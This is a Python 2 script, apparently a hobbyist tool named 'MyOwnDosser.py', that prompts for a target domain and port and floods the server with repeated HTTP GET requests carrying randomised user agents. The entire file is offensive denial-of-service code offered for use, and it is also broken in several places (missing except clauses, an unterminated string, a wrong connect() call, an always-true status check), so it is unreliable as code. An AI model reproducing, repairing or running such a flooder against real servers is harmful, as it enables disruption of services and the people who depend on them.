# For python version 2

########################################################
#            MyOwnDosser.py , by Harold.H.S            #
# This program attack the target server with tcp proto #
#    This program also can read the user-agent file    #
#   This program has no copyright , you can edit it    #
########################################################

#import the module
import socket, sys, threading, time, random
from datetime import datetime

#Global parameter
user_agents_list = []
request_code = 0
request_flag = 0
request_counter = 0
header = ""

#help function
def help():
  print "Enter 'exploit' to start the exploit"
  print "[info] Please enter the port in integer"
  print "[info] Please enter the domain only , without the protocol"
  print "[info] Please enter the file with the directory\n"
  
#starter function
def starter():
  print "[*] Starting the dos attack at %s" % datetime.now()
  print "\n=======================================================\n"

#finisher function
def finisher():
  global request_code, request_counter
  print "\n=======================================================\n"
  if request_code >= 500:
    print "[*] Configuring..."
    time.sleep(3)
    print "[+] Exploit complete"
    print "[+] Session created\n"
    sys.exit()
  else:
    print "[*] Configuring..."
    time.sleep(3)
    print "[-] Exploit not complete"
    print "[-] Session not created\n"
    sys.exit()

#start function
def start():
  global user_agents_list
  try:
    command = raw_input("MyOwnDosser.py : ")
    if command == "exploit":
      try:
        target_domain = raw_input("[init] Please enter the target domain : ")
        target_port = int(raw_input("[init] Please enter the target port : "))
        user_file = raw_input("[init] Please enter the user-agent file : ")
        print "[*] Starting program\n"
        user_agents_file = open(user_file, "r")
        for user_agents in user_agents_file:
          user_agents_list.append(user_agents)
        exploit(target_domain, target_port)
      except ValueError:
        print "\n[-] Error in value\n"
        sys.exit()
      except IOError:
        print "\n[-] Error in input output\n"
        sys.exit()
    elif command == "help":
      help()
    elif command == "exit":
      print "\n[-] Exiting console\n"
      sys.exit()
    else:
      print "\n[-] Invalid command\n"
  except KeyboardInterrupt:
    print "[-] Keuboard Interrupted\n"
    sys.exit()

#exploit function
def exploit(target_domain, target_port):
  global request_code, request_counter, request_flag
  try:
    try:
      print "[*] Trying to creating socket"
      dos_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      try:
        print "[*] Trying to get the domain ip"
        target_ip = socket.gethostbyname(target_domain)
        try:
          print "[*] Trying to connect to the server"
          dos_sock.connect(target_ip, target_port)
          starter()
          for requests in range(500):
            dos_attack = HttpTcpFlooder(target_domain, dos_sock)
            dos_attack.exploit()
          finisher()
      except socket.gaierror:
        print "[-] Failed to get address info\n"
        sys.exit()
    except socket.error:
      print "[-] Error in creating socket\n
      sys.exit()
  except KeyboardInterrupt:
    print "[-] Keyboard Interrupted\n"
    sys.exit()

# Class for the threaded dos attack
class HttpTcpFlooder(threading.Thread):
  global request_counter, request_code, request_flag
  def __init__(self, domain, sock):
    threading.Thread.__init__(self)
    self.domain = domain
    self.sock_pointer = sock
  def exploit(self):
    try:
      while request_flag != 2:
        HttpAttack(self.domain, self.sock_pointer)
      request_code += 1
    except Exception:
      pass
    print "%s requests sent" % request_counter
    request_code += 1
    return(request_code)
    return(request_counter)

def HttpAttack(domain, sock):
  data = HttpHeaderCreator(domain)
  sock.sendall(data, 1000)
  response = sock.recv(65565)
  if "200" or "201" or "202" in response:
    request_flag = 0
    request_counter += 1
  else:
    print "Request flag 2"
    request_counter += 0
    request_flag = 2
  return(request_counter)
  return(request_flag)

def HttpHeaderCreator(domain):
  global header, user_agents_list
  rand_user_agent = random.choice(user_agents_list)
  get_param = "GET / HTTP/1.1\n"
  host_param = "Host: %s\n" % domain
  user_agent_param = "User-Agent: %s\n" % rand_user_agent
  accept_param = "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n"
  accept_lang_param = "Accept-Language: en-gb,en;q=0.5\n"
  accept_encoding_param = "Accept-Encoding: gzip,deflate\n"
  accept_charset_param = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n"
  cache_control_param = "Cache-Control: no-cache\n"
  connection_param = "Connection: close\n"
  crlf = "\r\n"
  header = get_param+host_param+user_agent_param+accept_param+accept_lang_param+accept_encoding_param+accept_charset_param+cache_control_param+connection_param+crlf
  return(header)

if __name__ == '__main__':
  start()
